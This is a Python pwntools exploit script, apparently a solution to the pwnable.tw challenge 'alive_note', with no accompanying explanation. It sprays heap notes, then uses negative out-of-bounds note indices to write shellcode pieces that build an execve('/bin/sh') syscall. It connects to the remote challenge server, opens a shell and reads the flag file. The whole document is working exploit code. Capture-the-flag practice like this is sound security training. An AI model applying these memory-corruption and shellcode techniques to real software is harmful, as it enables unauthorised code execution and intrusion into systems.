#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal

from pwn import *

#context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./pwn")
elf = ELF(pwn_file)
libc = ELF("./bc.so.6")

if len(sys.argv) == 1:
    r = process(pwn_file)
    pid = r.pid
else:
    r = remote("chall.pwnable.tw", 10300)
    pid = 0

def debug():
    gdb.attach(r, "b *0x080487AE\nb *0x8048828")

def add(idx, name):
    r.sendlineafter(" :", '1')
    r.sendlineafter(" :", str(idx))
    r.sendafter(" :", name)

def show(idx):
    r.sendlineafter(" :", '2')
    r.sendlineafter(" :", str(-1814))

def dele(idx):
    r.sendlineafter(" :", '3')
    r.sendlineafter(" :", str(idx))

for i in range(0x4cb):
    if i%0x80 == 0:
        info("process: " + hex(i))
    add(0, 'a\n')
add(1, 'a\n')
add(0, 'a\n')
add(0, 'a\n')
add(0, 'a\n')
add(0, 'a\n')
dele(1)
add(1, 'aaaaXuF\n')
dele(1)
add(-22, 'PXj\n')
context.log_level = "debug"
add(-22, asm("xor eax, eax;ret")+'\n')

sh = """
    pop ebx
    pop ebx
    push 11
    pop eax
    int 0x80
"""
add(-27, asm(sh))
add(2, "/bin/sh\x00")
dele(2)

r.sendline("cat /home/alive_note/flag")
r.interactive()

